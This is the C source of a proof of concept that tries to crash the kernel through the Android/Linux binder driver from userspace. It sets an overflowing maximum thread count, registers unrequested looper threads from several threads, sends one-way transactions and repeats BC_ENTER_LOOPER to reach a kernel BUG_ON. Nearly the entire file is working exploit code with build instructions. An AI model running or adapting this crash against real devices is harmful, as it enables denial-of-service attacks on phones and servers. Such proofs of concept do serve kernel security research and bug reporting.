/*
 * binder_crash.c - Trigger kernel BUG/crash via binder from userspace
 *
 * Strategy: Overflow requested_threads_started by registering more loopers
 * than requested, then trigger a transaction that hits BUG_ON in
 * binder_pop_transaction_ilocked().
 *
 * Uses: SET_MAX_THREADS=0xFFFFFFFF + BC_REGISTER_LOOPER from multiple threads
 * without any BR_SPAWN_LOOPER request → underflows requested_threads counter
 *
 * Build: gcc -static -pthread -o binder_crash binder_crash.c
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

#define BINDER_VERSION          _IOWR('b', 9, int32_t)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_MAP_SIZE         (128 * 1024)

#define BC_ENTER_LOOPER     0x630d
#define BC_REGISTER_LOOPER  0x630b
#define BC_TRANSACTION      0x40406300

struct binder_write_read {
    int64_t write_size, write_consumed;
    uint64_t write_buffer;
    int64_t read_size, read_consumed;
    uint64_t read_buffer;
};

struct binder_transaction_data {
    union { uint32_t handle; void *ptr; } target;
    void *cookie;
    uint32_t code;
    uint32_t flags;
    int32_t sender_pid;
    uint32_t sender_euid;
    uint32_t data_size;
    uint32_t offsets_size;
    union {
        struct { unsigned long buffer; unsigned long offsets; } ptr;
        uint8_t buf[8];
    } data;
};

static int binder_fd;

static int binder_write(void *data, size_t len)
{
    struct binder_write_read bwr = {};
    bwr.write_size = len;
    bwr.write_buffer = (uint64_t)(unsigned long)data;
    return ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
}

static void *thread_register_looper(void *arg)
{
    /* Each thread opens its own binder fd to get its own binder_thread */
    int fd = open("/dev/binderfs/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) return NULL;

    void *map = mmap(NULL, BINDER_MAP_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { close(fd); return NULL; }

    /* Send BC_REGISTER_LOOPER without being asked → underflows requested_threads */
    uint32_t cmd = BC_REGISTER_LOOPER;
    struct binder_write_read bwr = {};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (uint64_t)(unsigned long)&cmd;
    ioctl(fd, BINDER_WRITE_READ, &bwr);

    /* Now send a transaction to ourselves to trigger transaction_stack manipulation */
    uint8_t buf[sizeof(uint32_t) + sizeof(struct binder_transaction_data)];
    uint32_t *pcmd = (uint32_t *)buf;
    *pcmd = BC_TRANSACTION;
    struct binder_transaction_data *tr = (struct binder_transaction_data *)(buf + 4);
    memset(tr, 0, sizeof(*tr));
    tr->target.handle = 0; /* service manager */
    tr->code = 1;
    tr->flags = 0x01; /* TF_ONE_WAY */

    bwr.write_size = sizeof(buf);
    bwr.write_buffer = (uint64_t)(unsigned long)buf;
    bwr.write_consumed = 0;
    ioctl(fd, BINDER_WRITE_READ, &bwr);

    munmap(map, BINDER_MAP_SIZE);
    close(fd);
    return NULL;
}

int main(void)
{
    binder_fd = open("/dev/binderfs/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("open binder"); return 1; }

    void *map = mmap(NULL, BINDER_MAP_SIZE, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }

    printf("=== Binder Crash PoC ===\n");
    printf("pid=%d uid=%d\n", getpid(), getuid());

    /* Step 1: Set max_threads to overflow value */
    uint32_t max = 0xFFFFFFFF;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max);
    printf("[1] SET_MAX_THREADS = 0xFFFFFFFF\n");

    /* Step 2: BC_ENTER_LOOPER on main thread */
    uint32_t cmd = BC_ENTER_LOOPER;
    binder_write(&cmd, sizeof(cmd));
    printf("[2] BC_ENTER_LOOPER (main)\n");

    /* Step 3: Spawn threads that register as loopers without request */
    printf("[3] Spawning 8 threads doing BC_REGISTER_LOOPER...\n");
    pthread_t threads[8];
    for (int i = 0; i < 8; i++)
        pthread_create(&threads[i], NULL, thread_register_looper, NULL);
    for (int i = 0; i < 8; i++)
        pthread_join(threads[i], NULL);

    /* Step 4: BC_ENTER_LOOPER again on main — duplicate */
    binder_write(&cmd, sizeof(cmd));
    printf("[4] BC_ENTER_LOOPER again (duplicate)\n");

    printf("[*] If kernel didn't crash, check dmesg for binder_user_error\n");

    munmap(map, BINDER_MAP_SIZE);
    close(binder_fd);
    return 0;
}
